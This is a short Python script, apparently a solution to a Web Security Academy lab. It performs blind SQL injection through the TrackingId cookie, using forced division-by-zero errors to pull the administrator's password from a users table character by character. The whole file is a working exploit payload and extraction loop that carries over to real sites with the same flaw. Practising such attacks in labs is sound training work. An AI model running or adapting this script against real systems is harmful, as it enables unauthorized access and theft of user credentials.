import requests
import string

url = "https://acd51f971f211f2c8053d235009400db.web-security-academy.net/"


def query(payload):
    cookie = { 'TrackingId': payload }
    r = requests.get(url, cookies=cookie)

    if r.status_code == 500:
        return 1
    else:
        return 0

password = ''
i = 1
while True:
    for j in string.printable:
        payload = f"x' UNION SELECT CASE WHEN (username = 'administrator' AND substr(password, {i}, 1)='{j}') THEN to_char(1/0) ELSE 'a' END FROM users --"
        if query(payload) == 1:
            password += j
            break
    i += 1
    print(password)